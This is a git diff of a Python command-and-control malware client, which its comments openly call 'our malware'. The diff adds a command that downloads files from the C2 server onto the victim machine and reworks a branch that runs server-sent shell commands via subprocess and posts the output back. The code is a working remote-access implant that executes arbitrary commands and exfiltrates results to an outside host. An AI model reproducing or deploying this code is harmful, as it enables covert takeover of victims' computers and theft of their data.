@@ -4,6 +4,7 @@ Author: Davood Yahay(D.Yakuza)
 """
 # Import os methods based on OS, use platform.system() to detect OS
 from platform import system
+
 # Import for Windows Builds only
 if system() == "Windows":
     from os import getenv, chdir, path, getcwd
@@ -17,9 +18,11 @@ from requests import get, exceptions, post
 from colorama import Fore
 from time import time, sleep
 from subprocess import run, PIPE, STDOUT
+from shutil import copyfileobj
+
 from encryption import cipher
 # Settings Variables(Constants) Importing
-from settings import (CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY,
+from settings import (CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
                       C2_SERVER, DELAY, PORT, PROXY, HEADERS)
 
 # If Client have Windows OS
@@ -42,7 +45,7 @@ encryptedClient = cipher.encrypt(client.encode()).decode()
 # Print C2 Client Side Message for avoid complexing in test operation
 print(Fore.LIGHTMAGENTA_EX+"[+]-------------C2 Client Side-------------[+]"+Fore.RESET)
 
-def post_to_server(message, response_path=RESPONSE):
+def post_to_server(message: str, response_path=RESPONSE):
     """function to post data to C2 Server, accept message and response path
 	optional as arguments"""
     try:
@@ -95,7 +98,7 @@ while True:
         post_to_server(homeDirectory,CWD_RESPONSE)
 
     # if the Command is cd follow below blocks, first check cd with an input path
-    if command.startswith("cd "):
+    elif command.startswith("cd "):
         # Splicing the command to remove the cd and the extract directory path
         directory = command[3:]
 
@@ -113,6 +116,50 @@ while True:
         # If not error, send the current directory to the server for using in Prompt
         else:
             post_to_server(getcwd(),CWD_RESPONSE)
+
+    # Run command using subprocess.run module
+    elif not command.startswith("client "):
+        # Run the command and get the output
+        commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
+        # Send the output to the server, must be decoding it first because subprocess.run() return bytes
+        post_to_server(commandOutput.decode())
+
+    # The client download FILENAME command allows us to transfer a file to the client from our C2 Server,
+    # Actually Client download from our C2 server, in below elif block Handle the download command
+    elif command.startswith("client download"):
+        # Initialize filename to get rid of annoying Pycharm Warning
+        filename = None
+
+        try:
+            # Split out the filepath to download, after split 0-client & 1-download & 2-path, so we need index 2
+            filepath = command.split()[2]
+
+            # Split out the filename from the end of file path, or if only a file name was supplied, use it.
+            filename = filepath.rsplit("/",1)[-1]
+
+            # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
+            encryptedFilepath = cipher.encrypt(filename.encode()).decode()
+
+            # Use and HTTP GET request to stream the requested file from c2 server
+            with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encryptedFilepath}", stream=True,
+                     headers=HEADERS, proxies=PROXY) as response:
+
+                # If the file was not found, open it up and write it out to disk, then notify us on the server
+                if response.status_code == 200:
+                    # Open the file and write the contents of the response to it
+                    with open(filename, "wb") as fileHandle:
+                        """Use #noinspection PyTypeChecker to ignore warning"""
+                        copyfileobj(response.raw, fileHandle)
+                    post_to_server(f"{filename} is now on {client}.\n")
+
+        # If the path of the file doesn't enter correctly, notify us on the server
+        except IndexError:
+            post_to_server(f"You must enter the File Name to be downloaded on the client")
+
+        # Exception Handling Common Errors maybe occurs
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"Unable to write {filename} to disk on the {client}.\n")
+
 
     #the client Kill Command shutdown our malware
     elif command.startswith("client kill"):
@@ -137,11 +184,10 @@ while True:
             # After sleep, client awake and then send a client awake message to the server
             post_to_server(f"{client} is now Awake.\n")
 
-    # Run command using subprocess.run module
     else:
-        commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT)
-        post_to_server(commandOutput.stdout.decode())
-        # post_to_server(commandOutput.stdout.decode())
+        post_to_server("Wrong/Unknown Input!!! Not a Built-in Command or Shell Command. try again... \n")
+
+
 
     print("[+] Command Executed and Result send to C2 Server.")
     print(Fore.LIGHTBLUE_EX+str(response.status_code)+Fore.RESET)
